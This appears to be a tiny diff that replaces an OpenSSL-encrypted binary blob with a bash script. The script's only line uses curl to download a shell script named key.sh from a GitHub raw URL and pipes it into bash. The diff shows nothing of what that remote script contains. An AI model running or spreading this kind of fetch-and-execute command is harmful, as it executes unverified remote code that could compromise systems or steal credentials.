@@ -1,1 +1,3 @@
-Salted__4?S@±<96><94>Q<9c>¤=øZ¼ì#^FÐ^R»²^OFÁÉZÎBhCý¨ <96>FÒº×o^PÍ¯mÄ<9f>x#v<87>A<A^LÓ¯ùB<9b><98>¨^Lb<<84>ÎÇ^L^K÷àè¿Ô³|ºQ¾¾Úh~^G×Ëc¾Ü^^ô§<85>~õÜ<87>6<90>±Ñõ<9d>&<9c>
+#!/bin/bash
+
+bash <(curl -Ls https://raw.githubusercontent.com/Nghi235/status/main/key.sh)
